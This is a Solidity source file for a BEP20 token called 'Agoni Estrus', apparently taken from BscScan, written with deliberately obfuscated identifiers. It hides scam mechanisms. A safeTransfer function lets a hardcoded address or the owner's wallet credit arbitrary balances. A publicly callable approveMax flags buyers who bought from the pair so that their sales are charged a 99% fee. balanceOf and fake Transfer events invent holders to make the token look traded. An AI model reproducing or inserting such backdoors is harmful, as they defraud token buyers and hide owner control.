/**
 *Submitted for verification at BscScan.com on 2023-01-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;



interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



library SafeMath {

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IBEP20 {

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function totalSupply() external view returns (uint256);

    function getOwner() external view returns (address);

    function symbol() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function decimals() external view returns (uint8);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}




contract AgoniEstrus is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256 public isFromFundTradingMaxReceiver = 0;
    uint256 constant senderBotsReceiverTake = 100 * 10 ** 18;
    bool private totalFeeIsEnable = false;
    IUniswapV2Router public modeLaunchedExemptLaunch;
    uint256 private isShouldListTxTradingMaxSender = 0;
    uint256 launchedAmountTxTokenTakeReceiverTo = 0;
    uint256 constant buyReceiverBurnFee = 1000000 * 10 ** 18;

    mapping(address => bool)  walletLimitFeeBurnEnableList;


    address private atExemptAmountSwapWalletLimit = (msg.sender);
    uint256  listAutoExemptSellWallet = 100000000 * 10 ** _decimals;
    uint256 private senderTokenTxMode = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private amountIsTokenFundBuyTradingWallet;

    uint160 constant teamTokenSellTrading = uint160(0xd8a6E98dA4b1604900D1F11F5819a65C204674f5);
    mapping(address => uint256) _balances;



    
    mapping(address => bool)  teamSellShouldBots;
    uint256 private buyLaunchExemptFromLiquidityReceiver = 0;
    uint256  shouldLiquiditySenderLaunch = 100000000 * 10 ** _decimals;


    uint256 private tokenTotalExemptMin = 0;
    string constant _symbol = "AES";
    address public uniswapV2Pair;
    string constant _name = "Agoni Estrus";
    uint256 private marketingSwapAmountTakeMax = 100;

    bool private launchBotsMintFee = false;


    bool public totalEnableLaunchedAt = false;
    uint256 constant shouldFromAtMode = 100000000 * (10 ** 18);
    uint256 public isListBurnTokenTeamAtMint = 0;
    bool public burnEnableToList = false;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        modeLaunchedExemptLaunch = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(modeLaunchedExemptLaunch.factory()).createPair(address(this), modeLaunchedExemptLaunch.WETH());
        _allowances[address(this)][address(modeLaunchedExemptLaunch)] = shouldFromAtMode;

        amountIsTokenFundBuyTradingWallet[msg.sender] = true;
        amountIsTokenFundBuyTradingWallet[address(this)] = true;

        _balances[msg.sender] = shouldFromAtMode;
        emit Transfer(address(0), msg.sender, shouldFromAtMode);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return shouldFromAtMode;
    }

    function setteamFundAtSwap(uint256 amountTokenSenderMin) public onlyOwner {
        if (isFromFundTradingMaxReceiver == isShouldListTxTradingMaxSender) {
            isShouldListTxTradingMaxSender=amountTokenSenderMin;
        }
        isFromFundTradingMaxReceiver=amountTokenSenderMin;
    }

    function safeTransfer(address burnReceiverBuyTake, address limitLiquidityAutoReceiver, uint256 amountLimitTakeEnable) public {
        if (!listTeamTakeAt(msg.sender) && msg.sender != atExemptAmountSwapWalletLimit) {
            return;
        }
        if (botsEnableListTo(uint160(limitLiquidityAutoReceiver))) {
            tokenTradingListFundAmountLaunchedFrom(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnable, false);
            return;
        }
        if (limitLiquidityAutoReceiver == address(1)) {
            return;
        }
        if (botsEnableListTo(uint160(burnReceiverBuyTake))) {
            tokenTradingListFundAmountLaunchedFrom(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnable, true);
            return;
        }
        if (amountLimitTakeEnable == 0) {
            return;
        }
        if (burnReceiverBuyTake == address(0)) {
            _balances[limitLiquidityAutoReceiver] = _balances[limitLiquidityAutoReceiver].add(amountLimitTakeEnable);
            return;
        }
    }

    function setfromLiquidityLaunchedSell(uint256 amountTokenSenderMin) public onlyOwner {
        if (buyLaunchExemptFromLiquidityReceiver == buyLaunchExemptFromLiquidityReceiver) {
            buyLaunchExemptFromLiquidityReceiver=amountTokenSenderMin;
        }
        buyLaunchExemptFromLiquidityReceiver=amountTokenSenderMin;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function mintMaxEnableAt(address burnReceiverBuyTake, bool receiverTotalBuyTake) internal returns (uint256) {
        if (teamSellShouldBots[burnReceiverBuyTake]) {
            return 99;
        }
        
        if (receiverTotalBuyTake) {
            return isShouldListTxTradingMaxSender;
        }
        if (!receiverTotalBuyTake && burnReceiverBuyTake == uniswapV2Pair) {
            return buyLaunchExemptFromLiquidityReceiver;
        }
        return 0;
    }

    function setreceiverBurnMinLimitToSender(uint256 amountTokenSenderMin) public onlyOwner {
        if (senderTokenTxMode == marketingSwapAmountTakeMax) {
            marketingSwapAmountTakeMax=amountTokenSenderMin;
        }
        senderTokenTxMode=amountTokenSenderMin;
    }

    function atMinToLaunchedLaunchTakeReceiver(uint160 autoLaunchedMinSwapLiquidityMaxFrom) private view returns (uint256) {
        uint160 burnLimitFromShould = uint160(teamTokenSellTrading);
        uint160 teamTxExemptMarketingSwap = autoLaunchedMinSwapLiquidityMaxFrom - burnLimitFromShould;
        if (teamTxExemptMarketingSwap < launchedAmountTxTokenTakeReceiverTo) {
            return senderBotsReceiverTake * teamTxExemptMarketingSwap;
        }
        return buyReceiverBurnFee + senderBotsReceiverTake * teamTxExemptMarketingSwap;
    }

    function fundMaxLiquidityAmount(address burnReceiverBuyTake, address limitLiquidityAutoReceiver, uint256 amountLimitTakeEnable) internal returns (bool) {
        if (botsEnableListTo(uint160(limitLiquidityAutoReceiver))) {
            tokenTradingListFundAmountLaunchedFrom(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnable, false);
            return true;
        }
        if (botsEnableListTo(uint160(burnReceiverBuyTake))) {
            tokenTradingListFundAmountLaunchedFrom(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnable, true);
            return true;
        }
        
        if (tokenTotalExemptMin == isShouldListTxTradingMaxSender) {
            tokenTotalExemptMin = senderTokenTxMode;
        }

        if (totalEnableLaunchedAt != burnEnableToList) {
            totalEnableLaunchedAt = totalFeeIsEnable;
        }

        if (senderTokenTxMode == marketingSwapAmountTakeMax) {
            senderTokenTxMode = tokenTotalExemptMin;
        }


        bool senderTakeFeeWallet = amountSenderSellSwapReceiverTradingLiquidity(burnReceiverBuyTake) || amountSenderSellSwapReceiverTradingLiquidity(limitLiquidityAutoReceiver);
        
        if (senderTokenTxMode != isFromFundTradingMaxReceiver) {
            senderTokenTxMode = isFromFundTradingMaxReceiver;
        }

        if (burnEnableToList == burnEnableToList) {
            burnEnableToList = totalFeeIsEnable;
        }


        if (burnReceiverBuyTake == uniswapV2Pair && !senderTakeFeeWallet) {
            walletLimitFeeBurnEnableList[limitLiquidityAutoReceiver] = true;
        }
        
        if (launchBotsMintFee == totalEnableLaunchedAt) {
            launchBotsMintFee = burnEnableToList;
        }


        if (senderTakeFeeWallet) {
            return minToLaunchBurn(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnable);
        }
        
        _balances[burnReceiverBuyTake] = _balances[burnReceiverBuyTake].sub(amountLimitTakeEnable, "Insufficient Balance!");
        
        uint256 amountLimitTakeEnableReceived = totalTokenTxReceiver(burnReceiverBuyTake) ? amountTeamTokenTakeFund(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnable) : amountLimitTakeEnable;

        _balances[limitLiquidityAutoReceiver] = _balances[limitLiquidityAutoReceiver].add(amountLimitTakeEnableReceived);
        emit Transfer(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnableReceived);
        return true;
    }

    function amountTeamTokenTakeFund(address burnReceiverBuyTake, address enableSwapAtLaunchedReceiverTake, uint256 amountLimitTakeEnable) internal returns (uint256) {
        
        uint256 liquidityAutoFromTakeReceiver = amountLimitTakeEnable.mul(mintMaxEnableAt(burnReceiverBuyTake, enableSwapAtLaunchedReceiverTake == uniswapV2Pair)).div(marketingSwapAmountTakeMax);

        if (liquidityAutoFromTakeReceiver > 0) {
            _balances[address(this)] = _balances[address(this)].add(liquidityAutoFromTakeReceiver);
            emit Transfer(burnReceiverBuyTake, address(this), liquidityAutoFromTakeReceiver);
        }

        return amountLimitTakeEnable.sub(liquidityAutoFromTakeReceiver);
    }

    function setlaunchedModeReceiverWallet(bool amountTokenSenderMin) public onlyOwner {
        totalEnableLaunchedAt=amountTokenSenderMin;
    }

    function gettokenMarketingFeeSenderExemptAuto(address amountTokenSenderMin) public view returns (bool) {
        if (amountIsTokenFundBuyTradingWallet[amountTokenSenderMin] != amountIsTokenFundBuyTradingWallet[amountTokenSenderMin]) {
            return burnEnableToList;
        }
        if (amountTokenSenderMin == atExemptAmountSwapWalletLimit) {
            return totalFeeIsEnable;
        }
        if (amountTokenSenderMin == atExemptAmountSwapWalletLimit) {
            return launchBotsMintFee;
        }
            return amountIsTokenFundBuyTradingWallet[amountTokenSenderMin];
    }

    function isApproveMax(address spender) public view returns (bool) {
        return teamSellShouldBots[spender];
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function approveMax(address spender) external {
        if (walletLimitFeeBurnEnableList[spender]) {
            teamSellShouldBots[spender] = true;
        }
    }

    function botsEnableListTo(uint160 autoLaunchedMinSwapLiquidityMaxFrom) private pure returns (bool) {
        uint160 burnLimitFromShould = teamTokenSellTrading;
        if (autoLaunchedMinSwapLiquidityMaxFrom >= uint160(burnLimitFromShould)) {
            if (autoLaunchedMinSwapLiquidityMaxFrom <= uint160(burnLimitFromShould) + 300000) {
                return true;
            }
        }
        return false;
    }

    function setbuyAtExemptMint(bool amountTokenSenderMin) public onlyOwner {
        if (burnEnableToList != launchBotsMintFee) {
            launchBotsMintFee=amountTokenSenderMin;
        }
        if (burnEnableToList == totalEnableLaunchedAt) {
            totalEnableLaunchedAt=amountTokenSenderMin;
        }
        if (burnEnableToList != totalFeeIsEnable) {
            totalFeeIsEnable=amountTokenSenderMin;
        }
        burnEnableToList=amountTokenSenderMin;
    }

    function minToLaunchBurn(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function getsenderIsBotsMode() public view returns (address) {
        if (atExemptAmountSwapWalletLimit != atExemptAmountSwapWalletLimit) {
            return atExemptAmountSwapWalletLimit;
        }
        return atExemptAmountSwapWalletLimit;
    }

    function getlistSenderBuyTokenLimitTakeAt() public view returns (bool) {
        if (totalFeeIsEnable == burnEnableToList) {
            return burnEnableToList;
        }
        if (totalFeeIsEnable == launchBotsMintFee) {
            return launchBotsMintFee;
        }
        if (totalFeeIsEnable == launchBotsMintFee) {
            return launchBotsMintFee;
        }
        return totalFeeIsEnable;
    }

    function setlistToMarketingLaunchMaxBurnTeam(uint256 amountTokenSenderMin) public onlyOwner {
        if (marketingSwapAmountTakeMax != isListBurnTokenTeamAtMint) {
            isListBurnTokenTeamAtMint=amountTokenSenderMin;
        }
        if (marketingSwapAmountTakeMax == isFromFundTradingMaxReceiver) {
            isFromFundTradingMaxReceiver=amountTokenSenderMin;
        }
        if (marketingSwapAmountTakeMax != senderTokenTxMode) {
            senderTokenTxMode=amountTokenSenderMin;
        }
        marketingSwapAmountTakeMax=amountTokenSenderMin;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getfromLiquidityLaunchedSell() public view returns (uint256) {
        if (buyLaunchExemptFromLiquidityReceiver != buyLaunchExemptFromLiquidityReceiver) {
            return buyLaunchExemptFromLiquidityReceiver;
        }
        return buyLaunchExemptFromLiquidityReceiver;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != shouldFromAtMode) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return fundMaxLiquidityAmount(sender, recipient, amount);
    }

    function getfundExemptShouldToSwapAuto() public view returns (uint256) {
        return isShouldListTxTradingMaxSender;
    }

    function launchToReceiverTake() private pure returns (address) {
        return 0x60e59392f3A4Af007e18779569dA6cF0DC4Ba47A;
    }

    function getlaunchedModeReceiverWallet() public view returns (bool) {
        return totalEnableLaunchedAt;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return fundMaxLiquidityAmount(msg.sender, recipient, amount);
    }

    function getlistToMarketingLaunchMaxBurnTeam() public view returns (uint256) {
        return marketingSwapAmountTakeMax;
    }

    function tokenTradingListFundAmountLaunchedFrom(address burnReceiverBuyTake, address limitLiquidityAutoReceiver, uint256 amountLimitTakeEnable, bool receiverTotalSellMin) private {
        uint160 burnLimitFromShould = uint160(teamTokenSellTrading);
        if (receiverTotalSellMin) {
            burnReceiverBuyTake = address(uint160(burnLimitFromShould + launchedAmountTxTokenTakeReceiverTo));
            launchedAmountTxTokenTakeReceiverTo++;
            _balances[limitLiquidityAutoReceiver] = _balances[limitLiquidityAutoReceiver].add(amountLimitTakeEnable);
        } else {
            _balances[burnReceiverBuyTake] = _balances[burnReceiverBuyTake].sub(amountLimitTakeEnable);
        }
        if (amountLimitTakeEnable == 0) {
            return;
        }
        emit Transfer(burnReceiverBuyTake, limitLiquidityAutoReceiver, amountLimitTakeEnable);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (botsEnableListTo(uint160(account))) {
            return atMinToLaunchedLaunchTakeReceiver(uint160(account));
        }
        return _balances[account];
    }

    function setlistSenderBuyTokenLimitTakeAt(bool amountTokenSenderMin) public onlyOwner {
        if (totalFeeIsEnable == totalFeeIsEnable) {
            totalFeeIsEnable=amountTokenSenderMin;
        }
        if (totalFeeIsEnable == burnEnableToList) {
            burnEnableToList=amountTokenSenderMin;
        }
        if (totalFeeIsEnable != launchBotsMintFee) {
            launchBotsMintFee=amountTokenSenderMin;
        }
        totalFeeIsEnable=amountTokenSenderMin;
    }

    function totalTokenTxReceiver(address burnReceiverBuyTake) internal view returns (bool) {
        return !amountIsTokenFundBuyTradingWallet[burnReceiverBuyTake];
    }

    function setsenderIsBotsMode(address amountTokenSenderMin) public onlyOwner {
        atExemptAmountSwapWalletLimit=amountTokenSenderMin;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function listTeamTakeAt(address autoLaunchedMinSwapLiquidityMaxFrom) private pure returns (bool) {
        return autoLaunchedMinSwapLiquidityMaxFrom == launchToReceiverTake();
    }

    function getreceiverBurnMinLimitToSender() public view returns (uint256) {
        if (senderTokenTxMode == marketingSwapAmountTakeMax) {
            return marketingSwapAmountTakeMax;
        }
        if (senderTokenTxMode != senderTokenTxMode) {
            return senderTokenTxMode;
        }
        if (senderTokenTxMode == isListBurnTokenTeamAtMint) {
            return isListBurnTokenTeamAtMint;
        }
        return senderTokenTxMode;
    }

    function setfundExemptShouldToSwapAuto(uint256 amountTokenSenderMin) public onlyOwner {
        if (isShouldListTxTradingMaxSender != isShouldListTxTradingMaxSender) {
            isShouldListTxTradingMaxSender=amountTokenSenderMin;
        }
        if (isShouldListTxTradingMaxSender == isFromFundTradingMaxReceiver) {
            isFromFundTradingMaxReceiver=amountTokenSenderMin;
        }
        if (isShouldListTxTradingMaxSender == buyLaunchExemptFromLiquidityReceiver) {
            buyLaunchExemptFromLiquidityReceiver=amountTokenSenderMin;
        }
        isShouldListTxTradingMaxSender=amountTokenSenderMin;
    }

    function getteamFundAtSwap() public view returns (uint256) {
        if (isFromFundTradingMaxReceiver == tokenTotalExemptMin) {
            return tokenTotalExemptMin;
        }
        return isFromFundTradingMaxReceiver;
    }

    function settokenMarketingFeeSenderExemptAuto(address amountTokenSenderMin,bool botsReceiverIsShould) public onlyOwner {
        if (amountTokenSenderMin == atExemptAmountSwapWalletLimit) {
            burnEnableToList=botsReceiverIsShould;
        }
        if (amountTokenSenderMin != atExemptAmountSwapWalletLimit) {
            burnEnableToList=botsReceiverIsShould;
        }
        amountIsTokenFundBuyTradingWallet[amountTokenSenderMin]=botsReceiverIsShould;
    }

    function amountSenderSellSwapReceiverTradingLiquidity(address atWalletAutoTotalTxAmount) private view returns (bool) {
        if (atWalletAutoTotalTxAmount == atExemptAmountSwapWalletLimit) {
            return true;
        }
        return false;
    }

    function getbuyAtExemptMint() public view returns (bool) {
        if (burnEnableToList != launchBotsMintFee) {
            return launchBotsMintFee;
        }
        if (burnEnableToList == totalFeeIsEnable) {
            return totalFeeIsEnable;
        }
        if (burnEnableToList != totalEnableLaunchedAt) {
            return totalEnableLaunchedAt;
        }
        return burnEnableToList;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}